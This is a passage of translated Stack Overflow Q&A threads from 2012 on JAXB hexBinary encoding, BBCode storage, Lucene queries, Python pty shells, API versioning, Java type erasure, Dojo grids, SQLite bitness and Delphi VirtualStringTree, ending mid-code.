> 时间：2013-01-02T15:36:44.017

你可以看看这个来源

[GMap Demo App 源码](http://www.google.com/url?q=https://github.com/libbybaldwin/GMap-Demo-App&sa=D&usg=AFQjCNF38kZ7J7LfuwJ_kD1WhrV2Xl-r9Q)

您也可以在 Google Play 上找到它

[AppLaud 的 GMap 演示](https://play.google.com/store/apps/details?id=com.mds.gmapdemo)

# jakarta-ee - JAXB Marshaller：StringWriter 输出具有截断的标记值

> ID：12146217
> 
> 赞同：3
> 
> 时间：2012-08-27T16:58:28.550
> 
> 标签：jakarta-ee, jaxb

我想将一个 java 对象编组为 xml 字符串。因此，我得到了一个模式，我从中生成 JAXB 类。有一个 set 方法（对应于模式中十六进制类型的元素），我必须在其中设置一个字符串。字符串大小约为 2566。通过 setter 方法将数据设置到对象中后，我调用 marshaller 传递 stringWriter 参数。

但是在打印 stringWriter 时，我看到它被截断了。我没有看到整个 2566 个字符。

怎么了？有任何想法吗？

谢谢！

**更新：**

我想我找到了问题所在。我必须找到一个合适的标题，因为我对问题的推理是错误的！！问题如下：我的架构中有一个“hexbinary”元素。生成的类有相应的 set/get 方法。要设置值，我使用了 apache commons 包的 HexEncodeString 方法，并意识到编组器在十六进制标记中显示 36383639 字符串“hi”，其实际十六进制编码为 6869 :( 因此，问题是编组后的 xml 有一个标记# of chars 的值大于原始字符，并且不会像我之前想的那样被截断！

感谢*Blaise Doughan*的代码。我已经修改它并重现了这个问题。

首先是一个示例模式：

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<xs:schema version="1.0" xmlns:xs="http://www.w3.org/2001/XMLSchema">

  <xs:complexType name="Root">
    <xs:sequence>
      <xs:element name="string" type="xs:string" minOccurs="0"/>
            <xs:element name="a" type="xs:hexBinary" minOccurs="0"/>
    </xs:sequence>
  </xs:complexType>
</xs:schema> 
```

有了这个，我生成了 ObjectFactory 类和 Root 类。我必须修改 ObjectFactory 类以包含 JAXBElement，以便我可以将它传递给 Marshaller。有了这些，我参加了 Blaise Doughan 的 Demo 课程并将其修改为：

```
public class Demo {

    public static void main(String[] args) throws Exception {
        JAXBContext jc = JAXBContext.newInstance(Root.class);      

    // The object factory
    ObjectFactory objFactory = new ObjectFactory();
    Root root = new Root();
    String str = new String("hi");
    String val = Hex.encodeHexString(str.getBytes());
    root.setString(str);
    root.setArr(val.getBytes());

        System.out.println("val="+val);
        System.out.println("getString ="+root.getString());
        System.out.println("getArr="+new String(root.getArr()));

        // Marshal the object to a StringWriter
        Marshaller marshaller = jc.createMarshaller();
        marshaller.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, true);
        marshaller.setProperty(Marshaller.JAXB_ENCODING, "UTF-8");
        marshaller.setProperty(Marshaller.JAXB_SCHEMA_LOCATION, "http://www.example.com/schema.xsd");
        StringWriter stringWriter = new StringWriter();
        marshaller.marshal(objFactory.createRoot(root),stringWriter);
//      marshaller.marshal(root, stringWriter);

        // Convert StringWriter to String
        String xml = stringWriter.toString();
        System.out.println(xml);

        // Unmarshal the XML and check length of long String
        Unmarshaller unmarshaller = jc.createUnmarshaller();
        Root unmarshalledRoot = (Root) unmarshaller.unmarshal(new StringReader(xml));
        System.out.println(root.getString().length());
        System.out.println(root.getString());
        System.out.println(new String(root.getArr()).length());
        System.out.println(new String(root.getArr()));
    }

} 
```

我得到的输出是：

```
val=6869
getString =hi
getArr=6869
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<ns3:Root xsi:schemaLocation="http://www.example.com/schema.xsd" xmlns:ns3="http://example.com/root" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <string>hi</string>
    <arr>36383639</arr>
</ns3:Root>

Exception in thread "main" javax.xml.bind.UnmarshalException: unexpected element (uri:"http://example.com/root", local:"Root"). Expected elements are (none)
    at com.sun.xml.internal.bind.v2.runtime.unmarshaller.UnmarshallingContext.handleEvent(UnmarshallingContext.java:631)
    at com.sun.xml.internal.bind.v2.runtime.unmarshaller.Loader.reportError(Loader.java:236)
    at com.sun.xml.internal.bind.v2.runtime.unmarshaller.Loader.reportError(Loader.java:231)
    at com.sun.xml.internal.bind.v2.runtime.unmarshaller.Loader.reportUnexpectedChildElement(Loader.java:105)
    at com.sun.xml.internal.bind.v2.runtime.unmarshaller.UnmarshallingContext$DefaultRootLoader.childElement(UnmarshallingContext.java:1038)
    at com.sun.xml.internal.bind.v2.runtime.unmarshaller.UnmarshallingContext._startElement(UnmarshallingContext.java:467)
    at com.sun.xml.internal.bind.v2.runtime.unmarshaller.UnmarshallingContext.startElement(UnmarshallingContext.java:448)
    at com.sun.xml.internal.bind.v2.runtime.unmarshaller.SAXConnector.startElement(SAXConnector.java:137)
    at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.startElement(AbstractSAXParser.java:501)
    at com.sun.org.apache.xerces.internal.impl.XMLNSDocumentScannerImpl.scanStartElement(XMLNSDocumentScannerImpl.java:400)
    at com.sun.org.apache.xerces.internal.impl.XMLNSDocumentScannerImpl$NSContentDriver.scanRootElementHook(XMLNSDocumentScannerImpl.java:626)
    at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(XMLDocumentFragmentScannerImpl.java:3103)
    at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl$PrologDriver.next(XMLDocumentScannerImpl.java:922)
    at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(XMLDocumentScannerImpl.java:648)
    at com.sun.org.apache.xerces.internal.impl.XMLNSDocumentScannerImpl.next(XMLNSDocumentScannerImpl.java:140)
    at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:511)
    at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:808)
    at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:737)
    at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:119)
    at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1205)
    at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:522)
    at com.sun.xml.internal.bind.v2.runtime.unmarshaller.UnmarshallerImpl.unmarshal0(UnmarshallerImpl.java:200)
    at com.sun.xml.internal.bind.v2.runtime.unmarshaller.UnmarshallerImpl.unmarshal(UnmarshallerImpl.java:173)
    at javax.xml.bind.helpers.AbstractUnmarshallerImpl.unmarshal(AbstractUnmarshallerImpl.java:137)
    at javax.xml.bind.helpers.AbstractUnmarshallerImpl.unmarshal(AbstractUnmarshallerImpl.java:194)
    at example.Demo.main(Demo.java:43) 
```

为什么 arr 标签是 36383639 而不是 6869？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T17:31:14.680

**NEW ANSWER**

In your sample code `val` is the hexBinary representation of `str.getBytes()`. But the value you are setting on the `arr` property is the bytes from the hex encoded String.

```
String str = new String("hi");
String val = Hex.encodeHexString(str.getBytes());
root.setString(str);
root.setArr(val.getBytes()); 
```

I believe what you mean to do is the following:

```
String str = new String("hi");
String val = Hex.encodeHexString(str.getBytes());
root.setString(str);
root.setArr(str.getBytes()); 
```

Which will produce the following output

```
val=6869
getString =hi
getArr=hi
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<root xsi:schemaLocation="http://www.example.com/schema.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <string>hi</string>
    <a>6869</a>
</root> 
```

Put another way

```
 String str = new String("hi");
    System.out.print("String:  " + str);
    System.out.println(" hexBinary:  " + Hex.encodeHexString(str.getBytes()));
    String val = Hex.encodeHexString(str.getBytes());
    System.out.print("String:  " + val);
    System.out.println(" hexBinary:  " + Hex.encodeHexString(val.getBytes())); 
```

Will output:

```
String:  hi hexBinary:  6869
String:  6869 hexBinary:  36383639 
```

* * *

**ORIGINAL ANSWER**

I have not been able to reproduce the issue that you are seeing. I am using a `String` size of `500000`. Below is what I have tried (does this sample work for you?). Is it possible that the truncation is due to the console you are writing the long String to?

**Demo**

```
package forum12146217;

import java.io.*;
import javax.xml.bind.*;

public class Demo {

    public static void main(String[] args) throws Exception {
        JAXBContext jc = JAXBContext.newInstance(Root.class);

        // Build a long String
        StringBuilder stringBuilder = new StringBuilder();
        for(int x=0; x<500000; x++) {
            stringBuilder.append("a");
        }
        Root root = new Root();
        root.setString(stringBuilder.toString());
        System.out.println(root.getString().length());

        // Marshal the object to a StringWriter
        Marshaller marshaller = jc.createMarshaller();
        marshaller.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, true);
        marshaller.setProperty(Marshaller.JAXB_ENCODING, "UTF-8");
        marshaller.setProperty(Marshaller.JAXB_SCHEMA_LOCATION, "http://www.example.com/schema.xsd");
        StringWriter stringWriter = new StringWriter();
        marshaller.marshal(root, stringWriter);

        // Convert StringWriter to String
        String xml = stringWriter.toString();
        //System.out.println(xml);

        // Unmarshal the XML and check length of long String
        Unmarshaller unmarshaller = jc.createUnmarshaller();
        Root unmarshalledRoot = (Root) unmarshaller.unmarshal(new StringReader(xml));
        System.out.println(unmarshalledRoot.getString().length());
    }

} 
```

**Root**

```
package forum12146217;

import javax.xml.bind.annotation.XmlRootElement;

@XmlRootElement
public class Root {

    private String string;

    public String getString() {
        return string;
    }

    public void setString(String string) {
        this.string = string;
    }

} 
```

**Output**

```
500000
500000 
```

# php - bbcode 表单编辑器作为 html 进入 db

> ID：12146219
> 
> 赞同：0
> 
> 时间：2012-08-27T16:58:55.437
> 
> 标签：php, html, bbcode

我有一个带有自定义 BB 代码编辑器的表单。我遇到的问题是：如果我想做一个粗体文本，它会给我`[b]text[/b]`。所以提交表单后使用无用。我有一个预览，它显示了它的外观。这是我的代码：[代码](http://pastebin.com/zecK8cQy) 这进入形式本身：

```
<script type="text/javascript">
  $(document).ready(function(){
    $("#fulls").bbcode();
    process();
  });

  var bbcode="";
  function process()
  {
        if (bbcode != $("#fulls").val())
        {
            bbcode = $("#fulls").val();
            $.get('php/bbParser.php',
            {
                bbcode: bbcode
            },
            function(txt){
                $("#full").html(txt);
                })

        }
        setTimeout("process()", 2000);

  }

</script> 
```

textare 是带有 [b]Text[/b] 的原始文本。

```
<textarea name="fulls" id="fulls""></textarea> 
```

这是预览：

```
<div name="full" id="full" ></div> 
```

在这种情况下，我自己想到了两种选择。1\. 当我想从数据库中取出 [b]Text[/b] 时，创建一个替换它的代码。2\. 将预览输出到另一个文本文件中，该文本文件使用所有正确的 html 提交给 DB。

在我看来，选项 2 更容易，但我不知道是否可以将 html 添加到数据库表中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:03:58.553

您需要将 BB 代码存储在您的数据库中，以防您希望以后能够轻松地对其进行编辑。

快速的 Google 搜索将提供脚本，可以轻松地将 BB 代码按需转换为 HTML。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:04:52.213

使用选项 1 绝对更安全。将 BBCode 存储在数据库中意味着对您的站点进行攻击的潜在途径数量有限，因为您支持的总标签数量非常有限。

# lucene - Lucene.net - 查询返回不需要的文档

> ID：12146220
> 
> 赞同：1
> 
> 时间：2012-08-27T16:59:00.427
> 
> 标签：lucene, lucene.net

我所有的 Lucene.net (2.9.2) 文档都有两个字段：

*   类别ID
*   主体

`bodytext`是默认字段，是存储所有文档文本的位置（使用`Field.Store.NO , Field.Index.ANALYZED, Field.TermVector.WITH_POSITIONS_OFFSETS`）。

`categoryid`只是一个存储为文本的数字字段：`Field.Store.YES, Field.Index.NOT_ANALYZED`

执行此查询时，它仅返回具有该类别 ID 的文档：`categoryid:1`

但是，当我执行此查询时：`categoryid:1 foo bar`它返回除 1 之外的其他类别的文​​档。

为什么是这样？以及如何强制它尊重原始`categoryid:N`查询词？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T17:27:06.827

您想要求输入的所有单词都出现在匹配的文档中吗？

```
var analyzer = new StandardAnalyzer(Version.LUCENE_30);
var queryParser = new QueryParser(Version.LUCENE_30, "bodytext", analyzer);

// This ensures that all terms are required.
queryParser.DefaultOperator = QueryParser.Operator.AND;

var query = queryParser.Parse("categoryid:1 foo bar");
// query = "+categoryid:1 +bodytext:foo +bodytext:bar" 
```

# html - 如何将变量传递给顶级模板？

> ID：12146224
> 
> 赞同：0
> 
> 时间：2012-08-27T16:59:39.613
> 
> 标签：html, templates, meteor

我的意思是，如何将变量传递给顶层 html，而不是模板。谢谢

```
<head>
  <title>{{app_name}}</title>
</head> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T20:54:14.767

似乎没有将变量传递到 head 部分的明显方法。您不能像在正文中那样在其中使用模板。

但是，您可以根据需要从 JavaScript 设置标题。您可以在客户端代码中执行此操作，如下所示：

```
document.title = "My Page Title"; 
```

缺点是在 JavaScript 加载之前不会设置标题。

# python - 如何在单独的进程中运行 shell 并获得自动完成？（Python）

> ID：12146230
> 
> 赞同：2
> 
> 时间：2012-08-27T16:59:59.337
> 
> 标签：python, linux, shell, autocomplete

我有一个从某个设备获取输入流的 linux 应用程序。该输入应定向到 shell 进程，以便它向用户模拟标准 shell。到目前为止，我已经通过创建一个运行“/bin/sh”的进程来完成它，并将其输入、输出和 stderr 重定向如下：

```
import subprocess

p = subprocess.Popen(shell=False, args=['/bin/sh'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
_make_nonblocking(p.stdout) # sets O_NONBLOCK
_make_nonblocking(p.stderr) 
```

当我只是一个 pass 命令时，一切正常：

```
p.stdin.write('pwd\n')
p.stdout.read()
'/home/dave\n' 
```

对于自动完成，我尝试编写：

```
p.stdin.write('ls s\t')
p.stdout.read()
IOError: [Errno 11] Resource temporarily unavailable 
```

我希望得到一个可能完成的列表，但是在我将 '\n' 放入标准输入之前什么都没有发生。（此外，stderr 中没有任何等待）。

我查看了 telnetd 代码并看到了 pty 的使用。我尝试使用 pty.openpty() 并将 slave 设置为标准输入，但这也不起作用。应该怎么做？

更新：我按照建议使用了 -i 参数。现在我有一个问题，一旦我使用 Popen 并按 ENTER，python shell 就会移动到后台，如下所示：

```
>>> p = subprocess.Popen(shell=False, args=['/bin/sh', '-i'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
>>> <ENTER>
[1]+ Stopped                ipython
$ 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-27T17:05:20.563

使用`bash`自动完成功能仅在交互模式下有效：

```
-i        If the -i option is present, the shell is interactive. 
```

这将进行适当的模拟，包括显示提示和所有常见的东西。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-02T11:04:33.630

最终，为了彻底解决所有问题，我不得不做几件事：

1.  配置一个 pty 设备（在 python 中使用 pty 模块）。
2.  使用 termios（回声、信号处理等）设置适当的标志。
3.  开始一个新会话（这样信号就不会传播原始过程）。
4.  使用无缓冲文件（在 bufsize 中传递 0）打开 pty 设备。

这是有效的代码：

```
def prepare():
    os.setsid() # start a new detached session
    tty.setcbreak(sys.stdin) # set standard input to cbreak mode
    old = termios.tcgetattr(sys.stdin)
    old[0] |= termios.BRKINT # transforms break to SIGINT
    old[3] &= termios.ICANON # non-canonical mode
    old[3] |= termios.ECHO | termios.ISIG # set echo and signal characters handling
    cc = old[6]
    # make input unbuffered
    cc[termios.VMIN] = 1
    cc[termios.VTIME] = 0
    termios.tcsetattr(sys.stdin, termios.TCSANOW, old)

master, slave = pty.openpty()
master = os.fdopen(master, 'rb+wb', 0) # open file in an unbuffered mode
_make_non_blocking(master)

prog = subprocess.Popen(shell=False, args=['/bin/sh', '-i'], stdin=slave, stdout=slave, stderr=subprocess.STDOUT, preexec_fn=prepare) 
```

# android - API 更改和用户升级您的应用

> ID：12146231
> 
> 赞同：1
> 
> 时间：2012-08-27T17:00:01.547
> 
> 标签：android, ios

我正在尝试帮助我的公司制定一项策略，即我们应该在何时要求客户在与我们的后端服务交互之前升级他们已安装的移动应用程序。

目前，我们的应用程序已经上市 20 个月，我们对应用程序和后端服务进行了多次修改。其中只有一个“破坏”了任何东西，因此使用旧版本应用程序的客户在不升级到新版本的情况下无法再使用该应用程序。我们有适用于 iOS、Android 和 Kindle Fire 的应用程序，它们都使用相同的后端服务。我们目前有能力要求客户升级，我们只是没有使用它。

所以有两个问题：1）你是否需要用户升级，如果需要的话 2）你支持多少个旧版本的应用程序。

（附加信息，这是一个电子商务应用程序，所以如果你能说出你正在使用什么类型的应用程序，那将会很有帮助。）

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:01:44.390

您可能应该查看对 API 进行版本控制的策略。这样使用较旧/未升级应用程序的用户就会遇到问题。当他们升级到你的新版本时，他们会切换到新的 API 版本，一切都会正常工作。

来看看你支持多少个版本。这真的取决于你。如果您想强制用户更新，请让您的服务器拒绝对旧 API 的请求。这样，如果用户有兴趣进一步使用该应用程序，他必须升级。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T17:05:42.920

电子商务应用程序。我们控制应用程序连接的端点。在每个上游 HTTP 标头中，应用程序都会放置其版本号。Web 并可选地在“yellow”、“red”、“disable”的下游标头中添加标签。

如果应用程序得到一个黄色键，它会在某个好的时候告诉用户“这个应用程序已过时 - 你应该尽快更新到最新版本”

如果应用程序看到一个红色键，它会告诉用户尽快更新，否则应用程序将停止工作。

如果看到禁用标头。该应用程序停止发送上游消息并告诉用户该应用程序不再工作，如果他们想继续使用该服务然后更新该应用程序。

# objective-c - 如果 2 个数字相同，则排序删除 [XCODE/OBJ-C]

> ID：12146232
> 
> 赞同：0
> 
> 时间：2012-08-27T17:00:11.457
> 
> 标签：objective-c, ios, xcode, arrays, sorting

```
NSMutableArray *OneNameArray  = [NSMutableArray arrayWithArray:ScoreNameArray];
NSMutableArray *OneScoreArray = [NSMutableArray arrayWithArray:RoundOneScoreArray];

NSDictionary *temp = [NSDictionary dictionaryWithObjects:OneNameArray forKeys:OneScoreArray];
NSSortDescriptor *theDescriptor = [NSSortDescriptor sortDescriptorWithKey:nil ascending:NO selector:@selector(localizedStandardCompare:)];    
RoundOneScoreArray = [[temp allKeys] sortedArrayUsingDescriptors:[NSArray arrayWithObject:theDescriptor]];
ScoreNameArray = [temp objectsForKeys:RoundOneScoreArray notFoundMarker:[NSNull null]]; 
```

如果分数数组中有两个共同的数字，那么它将删除其中一个数字。我该如何解决？

谢谢 <3

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T19:38:14.573

我的理解是，您有一组名称和一组分数。名称通过数组的索引与分数相关联（即 name[i] 具有 score[i]）。在这种情况下，一种解决方案将是实现一种排序算法，该算法对分数数组进行排序，并将名称数组随身携带。

或者更好的计划可能是让 name 对象有一个 NSArray 成员变量，其中包含玩家每轮的得分。然后，您可以按给定回合的分数对名称数组进行排序。有什么理由这行不通吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:08:54.800

我建议你做的不是使用可变数组，而是使用可变字典。使用 NSNumber 作为键，名称作为对象。当您添加一个新的键值对时，其中的键与旧的相同，旧的将丢失，而新的将保留。

这应该会大大降低您的代码复杂性。

# java - Java：列表 知道 E.getClass()

> ID：12146234
> 
> 赞同：1
> 
> 时间：2012-08-27T17:00:18.617
> 
> 标签：java, collections, wildcard

众所周知，Java 集合的泛型`E`或通配符`?`是实例化特定集合中允许的内容/对象所必需的。

我的问题是我们可以从下面的代码中知道特定集合的通配符或对象吗？

```
Object inbound = java.io.ObjectInputStream().readObject();
if(inbound instanceof List<?>) {
   // know `?.getClass()`
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-27T17:02:31.063

不。由于类型擦除，在运行时没有办法区分`List`s。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-27T17:38:29.530

`inbound`如果是在类型声明中定义其类型参数的类，则只能找到类型参数。例如，假设您序列化了一个`NodeList`声明如下的实例：

```
final class NodeList extends ArrayList<Node> { } 
```

然后当你反序列化它时，你可以这样做：

```
Object inbound = ois.readObject();
if (inbound instanceof List<?>) {
  Type t = inbound.getClass().getGenericSuperclass();
  if (t instanceof ParameterizedType) {
    ParameterizedType pt = (ParameterizedType) t;
    for (Type p : pt.getActualTypeArguments()) {
      if (p instanceof TypeVariable<?>)
        System.out.println("Unknown");
      else
        System.out.println(p); /* Prints "interface Node" */
    }
  }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T17:24:21.827

如果您确定列表至少包含一个元素，则可以，在这种情况下，您可以简单地调用`getClass`它。

否则，这实际上是不可能的，尽管您可以将正确的 Class 对象与 List 一起序列化。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-27T17:47:55.300

恕我直言，如果您需要这样做，最好的解决方案是使用 Guice：[http](http://blog.publicobject.com/2008/11/guice-punches-erasure-in-face.html) ://blog.publicobject.com/2008/11/guice-punches-erasure-in-face.html 。

正如其他人所提到的，类型擦除是问题的根源。一个很好的解释是[http://docs.oracle.com/javase/tutorial/java/generics/erasure.html](http://docs.oracle.com/javase/tutorial/java/generics/erasure.html)。

您可以查看[源代码`ArrayList`](http://www.docjar.com/html/api/java/util/ArrayList.java.html)并查看其工作原理的示例。`ArrayList`持有一个（第`Object[]`111 行）。它不知道对象的类型。您可以看到“类型安全”实际上只是通过强制转换实现的，例如第 371 行。

# dojo - Dojo 1.8 添加新行

> ID：12146235
> 
> 赞同：0
> 
> 时间：2012-08-27T17:00:21.517
> 
> 标签：dojo

我在启用了 IndirectSelection 和 FilterPlugin 的情况下向 EnhancedGrid 添加了一个新行。添加新行的代码是：

```
grid.store.newItem({msConstId: response, msname: msName,description:description, msorder:msorder,eventType:eventTypeVal,eventTypeId:eventTypeId,isngrp:'N',eventAttribute:eventAttributeVal,eventAttributeId:eventAttribute});
grid.store.fetch(); 
```

这会创建一个新行，但它是隐藏的且不可见，并且存在于网格边界之外。我必须使用 Firebug 来验证它是否已创建。此新行不可见。我检查了带有新行的可见行的 html 代码，并且代码没有区别。

可能的原因是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-28T14:35:31.717

如你所愿 ：）

grid.store.fetch() 没有效果，调用 grid.render() - 这将使用当前加载的存储/项目集重新渲染表标记

# c# - System.Data.Sqlite.dll 32 bt 与 64 位 c#

> ID：12146237
> 
> 赞同：0
> 
> 时间：2012-08-27T17:00:25.697
> 
> 标签：c#, sqlite, x86, windows-7-x64

我有一个使用 c# 和 system.data.sqlite.dll x64 构建的 WCF 服务库。构建配置是任何 CPU。它工作正常。但是，当我将 system.data.sqlite.dll 更改为 x86 位版本时，对于任何 CPU 配置，它都会成功构建，但是当我运行 wcf 方法时，它会给出错误，对于 x86 构建配置，它会成功构建，但在调试时会出现以下错误使用 wcftestclient。

```
System.BadImageFormatException: Could not load file or assembly 'file:///C:\Users\lala\Desktop\New folder\New folder\CoreServiceWCF\CoreServiceWCF\CoreServiceWCF2\bin\x86\Debug\VplusCoreServiceWCF.dll' or one of its dependencies. An attempt was made to load a program with an incorrect format.
File name: 'file:///C:\Users\lala\Desktop\New folder\New folder\CoreServiceWCF\CoreServiceWCF\CoreServiceWCF2\bin\x86\Debug\VplusCoreServiceWCF.dll'
   at System.Reflection.RuntimeAssembly._nLoad(AssemblyName fileName, String codeBase, Evidence assemblySecurity, RuntimeAssembly locationHint, StackCrawlMark& stackMark, Boolean throwOnFileNotFound, Boolean forIntrospection, Boolean suppressSecurityChecks)
   at System.Reflection.RuntimeAssembly.InternalLoadAssemblyName(AssemblyName assemblyRef, Evidence assemblySecurity, StackCrawlMark& stackMark, Boolean forIntrospection, Boolean suppressSecurityChecks)
   at System.Reflection.Assembly.Load(AssemblyName assemblyRef)
   at Microsoft.Tools.SvcHost.ServiceHostHelper.LoadServiceAssembly(String svcAssemblyPath)

=== Pre-bind state information ===
LOG: User = lala-PC\lala
LOG: Where-ref bind. Location = C:\Users\lala\Desktop\New folder\New folder\CoreServiceWCF\CoreServiceWCF\CoreServiceWCF2\bin\x86\Debug\VplusCoreServiceWCF.dll
LOG: Appbase = file:///C:/Users/lala/Desktop/New folder/New folder/CoreServiceWCF/CoreServiceWCF/CoreServiceWCF2/bin/x86/Debug
LOG: Initial PrivatePath = NULL
Calling assembly : (Unknown).
===
LOG: This bind starts in LoadFrom load context.
WRN: Native image will not be probed in LoadFrom context. Native image will only be probed in default load context, like with Assembly.Load().
LOG: Using application configuration file: C:\Users\lala\Desktop\New folder\New folder\CoreServiceWCF\CoreServiceWCF\CoreServiceWCF2\bin\x86\Debug\VplusCoreServiceWCF.dll.config
LOG: Using host configuration file: 
LOG: Using machine configuration file from C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\machine.config.
LOG: Attempting download of new URL file:///C:/Users/lala/Desktop/New folder/New folder/CoreServiceWCF/CoreServiceWCF/CoreServiceWCF2/bin/x86/Debug/VplusCoreServiceWCF.dll.
ERR: Failed to complete setup of assembly (hr = 0x8007000b). Probing terminated. 
```

有人帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:27:17.543

当为任何 CPU 构建程序集时，它将采用您运行的计算机的最佳配置，这意味着如果您有 64 位 Windows，它将以 64 位模式运行，如果它在 32 位，它将以 32 位模式运行位 Windows，问题似乎是这个程序集：VplusCoreServiceWCF.dll，所以我建议你先检查这个程序集的位数，看看它是否正确（在你的情况下可能是 64 位）

编辑：四处挖掘我发现 WCF 测试客户端仅在 64 位模式下运行，因此您可能需要将其强制为 32 位，为此您可以在此处找到所需的信息：[我无法编译标准的“WCF 服务库” " x86 格式](https://stackoverflow.com/questions/3755761/i-cant-compile-a-standard-wcf-service-library-in-x86-format)

# delphi - 是否可以将 VirtualStringTree 用于主细节网格视图？

> ID：12146241
> 
> 赞同：8
> 
> 时间：2012-08-27T17:00:53.753
> 
> 标签：delphi, delphi-7, virtualtreeview, tvirtualstringtree

好吧，我在这里遇到了一些非常棘手的事情......我想将标题绘制/使用到 ChildNode。我认为这个想法是合理的，因为在子节点中有标题看起来很神奇，因此可以在表中指定子节点。VST 是否具有或根本不可能的功能？

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-30T01:52:12.773

***1\. 有没有办法将 VirtualTreeView 用于主/详细网格视图？***

不，目前没有这样的功能可用，恕我直言，因为这将涉及对现有代码的非常大的干预。

***2.如何为子节点详细网格视图创建功能齐全的标题？***

考虑到几种方法，如何模拟子节点的标题外观和行为我发现将嵌套树视图用于详细网格视图很有用。这为您带来了详细数据的分离性，并允许您将整个模拟最小化到将嵌套树视图定位到子节点的矩形中。

***2.1。启动项目***

在下面的项目中，我试图展示实现这样一个简单的任务是多么复杂，比如在子节点内定位控件可能是（不涉及原始的 VirtualTree 代码）。把它当作一个启动项目，而不是最终的解决方案。

***2.2\. 已知问题和限制：***

*   这个项目被编写和测试为每个根节点只使用一个孩子，所以当你超过这个限制时不要对行为感到惊讶，因为这不是设计的，甚至没有测试过
*   当主树的双击列大小调整动画列调整大小时，当 ScrollDC 函数滚动画布时，嵌套的树视图会被线条覆盖
*   为了保留 VirtualTree 代码而不改变我已经覆盖了滚动条更新的方法。它用于在需要更新滚动条时更新嵌套的树视图边界
*   当前`OnExpanded`实现在范围和滚动位置固定之前触发事件，这使得代码更加复杂并且有一个很大的弱点 - 详细树视图的边界在树显示后更新，有时可以看到

***2.3\. 项目代码***

它是在 Delphi 2009 中针对在 Delphi 7 中使用而编写和测试的。对于下一个代码的注释版本[`follow this link`](https://stackoverflow.com/revisions/12188882/1)：

***单元1.pas***

```
unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, VirtualTrees;

type
  TVTScrollBarsUpdateEvent = procedure(Sender: TBaseVirtualTree; DoRepaint: Boolean) of object;
  TVirtualStringTree = class(VirtualTrees.TVirtualStringTree)
  private
    FOnUpdateScrollBars: TVTScrollBarsUpdateEvent;
  public
    procedure UpdateScrollBars(DoRepaint: Boolean); override;
  published
    property OnUpdateScrollBars: TVTScrollBarsUpdateEvent read FOnUpdateScrollBars write FOnUpdateScrollBars;
  end;

type
  PNodeSubTree = ^TNodeSubTree;
  TNodeSubTree = class
    FChildTree: TVirtualStringTree;
  end;

type
  TForm1 = class(TForm)
    Button1: TButton;
    VirtualStringTree1: TVirtualStringTree;
    procedure FormCreate(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure VirtualStringTree1AfterAutoFitColumns(Sender: TVTHeader);
    procedure VirtualStringTree1BeforeDrawTreeLine(Sender: TBaseVirtualTree;
      Node: PVirtualNode; Level: Integer; var PosX: Integer);
    procedure VirtualStringTree1Collapsed(Sender: TBaseVirtualTree;
      Node: PVirtualNode);
    procedure VirtualStringTree1ColumnResize(Sender: TVTHeader;
      Column: TColumnIndex);
    procedure VirtualStringTree1Expanded(Sender: TBaseVirtualTree;
      Node: PVirtualNode);
    procedure VirtualStringTree1FocusChanging(Sender: TBaseVirtualTree; OldNode,
      NewNode: PVirtualNode; OldColumn, NewColumn: TColumnIndex;
      var Allowed: Boolean);
    procedure VirtualStringTree1FreeNode(Sender: TBaseVirtualTree;
      Node: PVirtualNode);
    procedure VirtualStringTree1MeasureItem(Sender: TBaseVirtualTree;
      TargetCanvas: TCanvas; Node: PVirtualNode; var NodeHeight: Integer);
  private
    procedure InvalidateSubTrees(Tree: TBaseVirtualTree);
    procedure ResizeSubTrees(Tree: TBaseVirtualTree);
    procedure UpdateSubTreeBounds(Tree: TBaseVirtualTree; Node: PVirtualNode);
    procedure OnUpdateScrollBars(Sender: TBaseVirtualTree; DoRepaint: Boolean);
  public
